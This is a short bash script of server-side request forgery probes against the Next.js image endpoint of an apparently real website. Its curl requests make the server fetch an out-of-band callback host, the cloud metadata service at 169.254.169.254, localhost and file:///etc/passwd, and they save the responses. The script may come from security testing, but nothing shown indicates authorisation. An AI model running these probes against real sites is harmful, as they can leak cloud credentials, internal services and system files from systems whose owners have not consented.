#!/bin/bash
B="https://www.infinitycapital.bh"
H="oob5b74c395dbee.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
OUT=tool_outputs
mkdir -p $OUT
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }

echo "### 1 legit image"
curl -s -o /dev/null -w "%{http_code} %{size_download} %{content_type}\n" "$B/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"

echo "### 2 oob host direct"
U=$(enc "http://$H/ssrf-direct")
curl -s -D $OUT/img_oob.h -o $OUT/img_oob.b "$B/_next/image?url=$U&w=640&q=75"
head -1 $OUT/img_oob.h; grep -i -E 'x-nextjs|content-type|cf-|x-vercel' $OUT/img_oob.h | head

echo "### 3 metadata"
U=$(enc "http://169.254.169.254/latest/meta-data/")
curl -s -D $OUT/img_meta.h -o $OUT/img_meta.b "$B/_next/image?url=$U&w=640&q=75"
head -1 $OUT/img_meta.h; head -c 300 $OUT/img_meta.b; echo

echo "### 4 localhost"
U=$(enc "http://127.0.0.1:3000/")
curl -s -D $OUT/img_local.h -o $OUT/img_local.b "$B/_next/image?url=$U&w=640&q=75"
head -1 $OUT/img_local.h; head -c 300 $OUT/img_local.b; echo

echo "### 5 file proto"
U=$(enc "file:///etc/passwd")
curl -s -D - -o /dev/null "$B/_next/image?url=$U&w=640&q=75" | head -3

echo "### 6 gopher/unexpected"
U=$(enc "http://$H/ssrf-gopher")
curl -s -o /dev/null -w "%{http_code}\n" "$B/_next/image?url=$U&w=640&q=1"

echo "### 7 redirect->oob (302 from controlled ctfassets? use httpbin-free: use our own oob redirect)"
echo "done"
